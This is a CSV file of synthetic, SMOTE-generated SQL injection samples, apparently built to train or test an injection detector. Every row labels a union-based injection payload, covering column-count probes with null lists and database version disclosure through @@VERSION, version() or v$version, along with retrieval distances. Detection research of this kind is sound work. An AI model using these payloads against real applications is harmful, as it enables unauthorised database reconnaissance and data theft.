id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000022,attack,union,"-7007  )   union all select 6704,6704--",nearest_attack_euclidean,R000240,0.8803894640791018
SMOTE_000023,attack,union,"-2085""  )   as hkev where 7730  =  7730 union all select 7730,7730--",nearest_attack_euclidean,R000103,1.207388132745487
SMOTE_000024,attack,union,"1"" where 2878  =  2878 union all select null,null,null,null,null#",nearest_attack_euclidean,R000308,0.9014337935650374
SMOTE_000025,attack,union,"1%""  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000264,0.21997836395073725
SMOTE_000026,attack,union," select * from users where id  =  '1' union select @ @1,version  (    )   --  1'",nearest_attack_euclidean,R000018,1.146431426068579
SMOTE_000027,attack,union,"-7007  )   union all select 6704,6704--",nearest_attack_euclidean,R000240,1.1472187155343248
SMOTE_000028,attack,union,-5970' where 2769  =  2769 union all select 2769--,nearest_attack_euclidean,R000237,1.3289146354340455
SMOTE_000029,attack,union,"-3620'||  (  select 'kmei' where 8533  =  8533 union all select 8533,8533,8533,8533--",nearest_attack_euclidean,R000190,2.2609041927636415
SMOTE_000030,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R000281,0.3186523992653475
SMOTE_000031,attack,union,"-8098%'  )   union all select 5697,5697,5697,5697,5697,5697,5697,5697,5697,5697#",nearest_attack_euclidean,R000072,0.5147258941581857
SMOTE_000032,attack,union,"-7824""   )    )     )   union all select 3800,3800,3800,3800,3800,3800,3800,3800,3800--",nearest_attack_euclidean,R000124,0.4989329582531239
SMOTE_000033,attack,union,"1'||  (  select 'xhqy' where 4531  =  4531 union all select null,null--",nearest_attack_euclidean,R000102,0.0931376943976502
SMOTE_000034,attack,union,"-5934' union all select 6096,6096,6096,6096,6096#",nearest_attack_euclidean,R000174,1.285442061893982
SMOTE_000035,attack,union,"-8950""   )    )    as uahs where 2113  =  2113 union all select 2113,2113,2113,2113,2113,2113,2113,2113,2113,2113#",nearest_attack_euclidean,R000054,0.5518722984209067
SMOTE_000036,attack,union,"1' union all select null,null#",nearest_attack_euclidean,R000078,0.30146611883037583
SMOTE_000037,attack,union,"1 where 4477  =  4477 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000139,1.339399748953105
SMOTE_000038,attack,union,"-4135'   )    )     )   union all select 4413,4413,4413#",nearest_attack_euclidean,R000291,0.35380075566686814
SMOTE_000039,attack,union,"-4596"" union all select 5761#",nearest_attack_euclidean,R000136,1.047239461070515
SMOTE_000040,attack,union,"1'  )   where 8628  =  8628 union all select null,null,null--",nearest_attack_euclidean,R000273,0.6322805393212891
SMOTE_000041,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000213,1.1346244557819973
SMOTE_000042,attack,union,"1' where 7688  =  7688 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000155,0.5093898111671161
SMOTE_000043,attack,union,"1%' union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000087,0.8312493381225564
SMOTE_000044,attack,union,"-5776%' union all select 3075,3075,3075,3075,3075--",nearest_attack_euclidean,R000113,0.6442068532141381
SMOTE_000045,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000216,1.1689542954130563
SMOTE_000046,attack,union,"-6659'  )   where 1256  =  1256 union all select 1256,1256--",nearest_attack_euclidean,R000160,0.4670874480849986
SMOTE_000047,attack,union,"1%'   )    )    union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000205,0.823632262928666
SMOTE_000048,attack,union,"-7122""  )   union all select 4002,4002,4002,4002,4002,4002,4002,4002#",nearest_attack_euclidean,R000092,0.36662438257382995
SMOTE_000049,attack,union,"-6440   )    )     )   union all select 3316,3316,3316,3316,3316,3316,3316,3316,3316,3316--",nearest_attack_euclidean,R000218,0.19560683323370587
SMOTE_000050,attack,union," select * from users where id  =  1  <@. union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000035,0.8099057410420749
SMOTE_000051,attack,union," select * from users where id  =  1 union select 1 $$,version  (    )   -- 1",nearest_attack_euclidean,R000036,1.905872886915666
SMOTE_000052,attack,union," select * from users where id  =  1 or $+<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000020,1.9512460095014332
SMOTE_000053,attack,union,"1""   )    )    as xhat where 6674  =  6674 union all select null,null,null#",nearest_attack_euclidean,R000170,0.003523029161164988
SMOTE_000054,attack,union,"-9959""  )   where 7073  =  7073 union all select 7073,7073,7073,7073,7073,7073,7073,7073#",nearest_attack_euclidean,R000192,0.038907082012979675
SMOTE_000055,attack,union,"-2787' union all select 3622,3622,3622,3622,3622,3622,3622,3622,3622,3622#",nearest_attack_euclidean,R000090,0.04238607252521514
SMOTE_000056,attack,union,"-4596"" union all select 5761#",nearest_attack_euclidean,R000136,1.0426339359822479
SMOTE_000057,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000175,0.03947998621750274
SMOTE_000058,attack,union,1 union all select null#,nearest_attack_euclidean,R000283,2.0639290072088143
SMOTE_000059,attack,union,"-8034""  )   where 1292  =  1292 union all select 1292,1292,1292,1292,1292#",nearest_attack_euclidean,R000178,1.2542517583988286
SMOTE_000060,attack,union,"-7371'  )   union all select 4531,4531,4531#",nearest_attack_euclidean,R000046,0.21893558786488113
SMOTE_000061,attack,union,"1  )   union all select null,null--",nearest_attack_euclidean,R000108,0.24320662802066703
SMOTE_000062,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000043,0.06477147121511759
SMOTE_000063,attack,union,"-2246""   )    )    union all select 4613,4613,4613,4613,4613,4613#",nearest_attack_euclidean,R000097,0.016066359210503995
SMOTE_000064,attack,union," select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000005,0.0026765383885235835
SMOTE_000065,attack,union,"-9032   )    )    union all select 8377,8377,8377,8377,8377,8377,8377,8377,8377#",nearest_attack_euclidean,R000196,0.8904413766367651
SMOTE_000066,attack,union,"1' in boolean mode  )   union all select null,null,null,null#",nearest_attack_euclidean,R000173,0.2313325459465422
SMOTE_000067,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000202,0.9647411138255986
SMOTE_000068,attack,union,"-7078'||  (  select 'lcza' where 5076  =  5076 union all select 5076,5076,5076,5076,5076,5076,5076,5076,5076,5076--",nearest_attack_euclidean,R000154,1.155344368165153
SMOTE_000069,attack,union," select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000002,1.3430060810867117
SMOTE_000070,attack,union,"-4045 union all select 6857,6857,6857,6857,6857,6857,6857--",nearest_attack_euclidean,R000095,0.1846251587227654
SMOTE_000071,attack,union,"-3952'  )   union all select 6644,6644,6644--",nearest_attack_euclidean,R000259,0.47226132960410544
SMOTE_000072,attack,union,"1%"" union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000172,0.9721411645960746
SMOTE_000073,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000224,0.588124410517896
SMOTE_000074,attack,union," select * from users where id  =  1 or 1#""1 union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000026,0.9267314551965767
SMOTE_000075,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000063,0.45955523028365236
SMOTE_000076,attack,union," select * from users where id  =  1<@<@ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000024,0.335828797202454
SMOTE_000077,attack,union," select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000003,0.9121953230021761
SMOTE_000078,attack,union,"1%""   )    )    union all select null,null,null,null--",nearest_attack_euclidean,R000071,0.05578679646313472
SMOTE_000079,attack,union,"1'   )    )    as bwjl where 8538  =  8538 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000167,0.49477066598592595
SMOTE_000080,attack,union,"1""  )   union all select null,null,null#",nearest_attack_euclidean,R000223,0.7682312961522126
SMOTE_000081,attack,union,"-4802 union all select 7381,7381,7381,7381,7381,7381,7381,7381,7381,7381--",nearest_attack_euclidean,R000231,0.2977084557309795
SMOTE_000082,attack,union,"1   )    )    union all select null,null--",nearest_attack_euclidean,R000298,0.09303329805455438
SMOTE_000083,attack,union,"-9032   )    )    union all select 8377,8377,8377,8377,8377,8377,8377,8377,8377#",nearest_attack_euclidean,R000196,0.8966150478163666
SMOTE_000084,attack,union,"1%"" union all select null,null,null#",nearest_attack_euclidean,R000247,0.3964396697689611
SMOTE_000085,attack,union,"-7240'   )    )    union all select 8064,8064,8064#",nearest_attack_euclidean,R000127,0.8477274742484099
SMOTE_000086,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000299,0.6672924081877918
SMOTE_000087,attack,union," select * from users where id  =  1 or $ 1  =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000033,1.710577897632133
SMOTE_000088,attack,union,"1%' union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000171,1.0950198910337734
SMOTE_000089,attack,union,"-2246""   )    )    union all select 4613,4613,4613,4613,4613,4613#",nearest_attack_euclidean,R000097,0.710782981070855
SMOTE_000090,attack,union," select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000004,0.27882412094619613
SMOTE_000091,attack,union,"1   )    )     )   union all select null,null#",nearest_attack_euclidean,R000161,1.3627028119607612
SMOTE_000092,attack,union," select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000002,0.6409148285027176
SMOTE_000093,attack,union,"1 where 4477  =  4477 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000139,0.2927267662586769
SMOTE_000094,attack,union,"-5957   )    )     )   union all select 8485,8485,8485,8485,8485,8485,8485,8485,8485--",nearest_attack_euclidean,R000238,0.6312797384327936
SMOTE_000095,attack,union,"1%' union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000171,0.5630069157231744
SMOTE_000096,attack,union,"-9734'   )    )    as izbx where 6273  =  6273 union all select 6273,6273,6273,6273,6273,6273,6273,6273,6273--",nearest_attack_euclidean,R000123,0.18103381219857348
SMOTE_000097,attack,union,"-3819'   )    )     )   union all select 9014,9014,9014,9014,9014,9014--",nearest_attack_euclidean,R000099,0.570099488268472
SMOTE_000098,attack,union," select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000005,0.15256177699947937
SMOTE_000099,attack,union,"1%' union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000087,1.3896520762974303
SMOTE_000100,attack,union,"-7272""  )   union all select 9163,9163,9163,9163,9163,9163,9163--",nearest_attack_euclidean,R000068,0.47640903720517525
SMOTE_000101,attack,union,"1' where 4245  =  4245 union all select null,null--",nearest_attack_euclidean,R000284,1.3512103263960444
SMOTE_000102,attack,union,"1'+  (  select 'pgje' where 4658  =  4658 union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000168,0.9588090107805595
SMOTE_000103,attack,union," select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000002,0.21575566913291228
SMOTE_000104,attack,union,"1""  )   as qwyt where 4236  =  4236 union all select null,null,null,null,null--",nearest_attack_euclidean,R000197,0.2724165011486484
SMOTE_000105,attack,union," select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000002,0.3425994497566799
SMOTE_000106,attack,union,-5970' where 2769  =  2769 union all select 2769--,nearest_attack_euclidean,R000237,1.8898269044858498
SMOTE_000107,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000076,0.7442045630700327
SMOTE_000108,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000213,0.2657482765662101
SMOTE_000109,attack,union,"-4045 union all select 6857,6857,6857,6857,6857,6857,6857--",nearest_attack_euclidean,R000095,0.14653064083386932
SMOTE_000110,attack,union,"-5706""   )    )    union all select 2013,2013,2013,2013#",nearest_attack_euclidean,R000091,0.48549310959402014
SMOTE_000111,attack,union,-2797'   )    )     )   union all select 5711#,nearest_attack_euclidean,R000285,0.06277155133393764
SMOTE_000112,attack,union,"1%"" union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000212,0.613650146637868
SMOTE_000113,attack,union,"-7007  )   union all select 6704,6704--",nearest_attack_euclidean,R000240,1.4994540517879111
SMOTE_000114,attack,union,"-7235""  )   union all select 4624,4624,4624,4624,4624,4624,4624,4624,4624,4624#",nearest_attack_euclidean,R000089,0.11814565423260623
SMOTE_000115,attack,union,"1"" union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000204,0.9400244000794233
SMOTE_000116,attack,union,"-7043""  )   where 9755  =  9755 union all select 9755,9755,9755,9755,9755,9755#",nearest_attack_euclidean,R000276,1.3581279177205707
SMOTE_000117,attack,union,"-2246""   )    )    union all select 4613,4613,4613,4613,4613,4613#",nearest_attack_euclidean,R000097,0.04095663392907115
SMOTE_000118,attack,union," select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000003,1.3062835465537206
SMOTE_000119,attack,union,"-6550'  )   where 1675  =  1675 union all select 1675,1675,1675,1675,1675,1675,1675--",nearest_attack_euclidean,R000219,1.1180373363896956
SMOTE_000120,attack,union,"1'||  (  select 'hfbt' where 7204  =  7204 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000133,0.4235919259715696
SMOTE_000121,attack,union," select * from users where id  =  '1' + $ . union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000012,1.6701826690515016
SMOTE_000122,attack,union,"-9574%'   )    )    union all select 5645,5645,5645,5645,5645,5645,5645--",nearest_attack_euclidean,R000141,0.018816729000780272
SMOTE_000123,attack,union," select * from users where id  =  1 union select !<@,version  (    )   -- 1",nearest_attack_euclidean,R000041,0.29817803941548887
SMOTE_000124,attack,union,"-6659'  )   where 1256  =  1256 union all select 1256,1256--",nearest_attack_euclidean,R000160,0.8821192873055831
SMOTE_000125,attack,union,"1'   )    )    union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000225,0.028188323190447704
SMOTE_000126,attack,union," select * from users where id  =  1 union select 1a,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000028,1.2251850977377794
SMOTE_000127,attack,union," select * from users where id  =  '1' union select @ @1,version  (    )   --  1'",nearest_attack_euclidean,R000018,0.20551674963334035
SMOTE_000128,attack,union," select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000006,0.11462004366655992
SMOTE_000129,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000070,0.7907776616808284
SMOTE_000130,attack,union,"-4347' union all select 6074,6074,6074,6074,6074,6074,6074--",nearest_attack_euclidean,R000080,0.7110558044605658
SMOTE_000131,attack,union,"-5706""   )    )    union all select 2013,2013,2013,2013#",nearest_attack_euclidean,R000091,1.4814565689426198
SMOTE_000132,attack,union,"-8098%'  )   union all select 5697,5697,5697,5697,5697,5697,5697,5697,5697,5697#",nearest_attack_euclidean,R000072,1.1163775883082903
SMOTE_000133,attack,union,-5970' where 2769  =  2769 union all select 2769--,nearest_attack_euclidean,R000237,0.29988156618543976
SMOTE_000134,attack,union,"1""   )    )     )   union all select null,null,null#",nearest_attack_euclidean,R000181,1.1973365044324238
SMOTE_000135,attack,union,"-8080""  )   as nlos where 8917  =  8917 union all select 8917,8917,8917,8917--",nearest_attack_euclidean,R000065,0.12561147056932112
SMOTE_000136,attack,union,"-6253' union all select 5756,5756,5756,5756,5756,5756,5756,5756,5756,5756#",nearest_attack_euclidean,R000177,0.09480436179563412
SMOTE_000137,attack,union,"-3179'+  (  select 'tzzz' where 3191  =  3191 union all select 3191,3191,3191,3191,3191#",nearest_attack_euclidean,R000081,1.5437200002596982
SMOTE_000138,attack,union,"1%"" union all select null,null,null#",nearest_attack_euclidean,R000247,0.539365939944424
SMOTE_000139,attack,union,"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",nearest_attack_euclidean,R000130,0.18254335142469744
SMOTE_000140,attack,union,"-4964""   )    )    union all select 4750,4750,4750,4750,4750--",nearest_attack_euclidean,R000098,0.10973578384901105
SMOTE_000141,attack,union,"1%' union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000230,0.9751752260051108
SMOTE_000142,attack,union,"-2434  )   union all select 8310,8310,8310,8310,8310--",nearest_attack_euclidean,R000146,0.6877631608599399
SMOTE_000143,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000236,0.5738113630155843
SMOTE_000144,attack,union,"-9997' union all select 9347,9347,9347,9347,9347,9347,9347,9347#",nearest_attack_euclidean,R000134,0.0002523666290831917
SMOTE_000145,attack,union,-5970' where 2769  =  2769 union all select 2769--,nearest_attack_euclidean,R000237,0.20884331981761795
SMOTE_000146,attack,union,"1'  )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000295,0.1178092750261469
SMOTE_000147,attack,union," select * from users where id  =  1.*\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000040,0.6776911139396635
SMOTE_000148,attack,union," select * from users where id  =  '1' + @ 1! union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000037,0.19063208936565396
SMOTE_000149,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000183,1.746406975026371
SMOTE_000150,attack,union,"-4694%""   )    )     )   union all select 9178,9178,9178,9178,9178--",nearest_attack_euclidean,R000222,0.5312426341803987
SMOTE_000151,attack,union,"-4135'   )    )     )   union all select 4413,4413,4413#",nearest_attack_euclidean,R000291,0.06751461092240939
SMOTE_000152,attack,union," select * from users where id  =  '1' or \<   =  1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000029,0.16237996415170045
SMOTE_000153,attack,union,"-1040 where 3058  =  3058 union all select 3058,3058,3058,3058,3058,3058,3058,3058,3058,3058--",nearest_attack_euclidean,R000210,0.7622563405377274
SMOTE_000154,attack,union,"-7794""  )   union all select 3910,3910,3910,3910,3910,3910,3910,3910,3910,3910#",nearest_attack_euclidean,R000057,0.8449815449522433
SMOTE_000155,attack,union,"1%'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000257,0.5751266259010523
SMOTE_000156,attack,union,"1%"" union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000212,0.48431583382754395
SMOTE_000157,attack,union,-6947'   )    )    as qqjp where 6700  =  6700 union all select 6700#,nearest_attack_euclidean,R000279,0.550717681912359
SMOTE_000158,attack,union,"-4596"" union all select 5761#",nearest_attack_euclidean,R000136,0.8000849445352383
SMOTE_000159,attack,union,"1%'   )    )    union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000205,0.436619756163345
SMOTE_000160,attack,union,"-6253' union all select 5756,5756,5756,5756,5756,5756,5756,5756,5756,5756#",nearest_attack_euclidean,R000177,0.009299898289891759
SMOTE_000161,attack,union,"-4028  )   where 3244  =  3244 union all select 3244,3244,3244,3244,3244,3244,3244,3244--",nearest_attack_euclidean,R000125,0.6045027470225939
SMOTE_000162,attack,union,"-6659'  )   where 1256  =  1256 union all select 1256,1256--",nearest_attack_euclidean,R000160,0.4860649904590289
SMOTE_000163,attack,union,"-4964""   )    )    union all select 4750,4750,4750,4750,4750--",nearest_attack_euclidean,R000098,0.08938872139443373
SMOTE_000164,attack,union,"-3819'   )    )     )   union all select 9014,9014,9014,9014,9014,9014--",nearest_attack_euclidean,R000099,0.4842307883338655
SMOTE_000165,attack,union,"-3819'   )    )     )   union all select 9014,9014,9014,9014,9014,9014--",nearest_attack_euclidean,R000099,0.6940615602922012
SMOTE_000166,attack,union,1'+  (  select 'wyxu' where 2555  =  2555 union all select null#,nearest_attack_euclidean,R000207,1.6810992745121773
SMOTE_000167,attack,union,"-2085""  )   as hkev where 7730  =  7730 union all select 7730,7730--",nearest_attack_euclidean,R000103,0.2931105772960045
SMOTE_000168,attack,union,"1 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000302,0.1911867003867212
SMOTE_000169,attack,union," select * from users where id  =  1<@<@ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000024,0.03437264951195241
SMOTE_000170,attack,union,"1   )    )     )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000217,0.6238043672863862
SMOTE_000171,attack,union,"-5524  )   as eoyk where 6928  =  6928 union all select 6928,6928,6928,6928,6928,6928,6928,6928,6928--",nearest_attack_euclidean,R000077,0.4027558268324705
SMOTE_000172,attack,union,"1'||  (  select 'xhqy' where 4531  =  4531 union all select null,null--",nearest_attack_euclidean,R000102,1.0313417568853855
SMOTE_000173,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000215,0.2223391535908955
SMOTE_000174,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000166,0.007788228173244229
SMOTE_000175,attack,union,"1' in boolean mode  )   union all select null,null,null,null#",nearest_attack_euclidean,R000173,0.4839440958606271
SMOTE_000176,attack,union,"-9795  )   as wrgs where 5427  =  5427 union all select 5427,5427,5427,5427,5427,5427--",nearest_attack_euclidean,R000048,0.9628653720229402
SMOTE_000177,attack,union,"1   )    )     )   union all select null,null#",nearest_attack_euclidean,R000161,0.2468087938237905
SMOTE_000178,attack,union," select * from users where id  =  '1' or \.<$ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000034,0.03281622345917322
SMOTE_000179,attack,union,"-7007  )   union all select 6704,6704--",nearest_attack_euclidean,R000240,0.7289643719770997
SMOTE_000180,attack,union,"1"" where 7249  =  7249 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000293,0.05707337182002521
SMOTE_000181,attack,union,"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",nearest_attack_euclidean,R000126,0.044552215171674
SMOTE_000182,attack,union,"-2787'   )    )    union all select 1996,1996,1996,1996,1996,1996,1996,1996#",nearest_attack_euclidean,R000307,0.9940811642401689
SMOTE_000183,attack,union,"-3794'  )   union all select 2485,2485,2485,2485,2485--",nearest_attack_euclidean,R000042,0.06921673229847003
SMOTE_000184,attack,union,"-6478""   )    )    union all select 7087,7087,7087,7087,7087,7087,7087,7087--",nearest_attack_euclidean,R000119,0.3088884882653417
SMOTE_000185,attack,union,"-4028  )   where 3244  =  3244 union all select 3244,3244,3244,3244,3244,3244,3244,3244--",nearest_attack_euclidean,R000125,1.5935088514164157
SMOTE_000186,attack,union,"-4694%""   )    )     )   union all select 9178,9178,9178,9178,9178--",nearest_attack_euclidean,R000222,0.5785727999290087
SMOTE_000187,attack,union,"-3721'  )   union all select 9050,9050--",nearest_attack_euclidean,R000045,0.4942972438592773
SMOTE_000188,attack,union,"-7794""  )   union all select 3910,3910,3910,3910,3910,3910,3910,3910,3910,3910#",nearest_attack_euclidean,R000057,0.030072435644504434
SMOTE_000189,attack,union,"1'   )    )    as ticp where 9794  =  9794 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000221,0.526629708824391
SMOTE_000190,attack,union," select * from users where id  =  '1' or \<\. union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000038,0.5165217781551166
SMOTE_000191,attack,union,"-3819'   )    )     )   union all select 9014,9014,9014,9014,9014,9014--",nearest_attack_euclidean,R000099,0.19065766565657596
SMOTE_000192,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000148,0.014385602711898671
SMOTE_000193,attack,union,-6947'   )    )    as qqjp where 6700  =  6700 union all select 6700#,nearest_attack_euclidean,R000279,1.5548690438002157
SMOTE_000194,attack,union,"1'  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000132,0.821689191431916
SMOTE_000195,attack,union,"1""  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000244,1.3615867015241958
SMOTE_000196,attack,union,"-2787' union all select 3622,3622,3622,3622,3622,3622,3622,3622,3622,3622#",nearest_attack_euclidean,R000090,0.19744196132238243
SMOTE_000197,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000213,0.1172133701030578
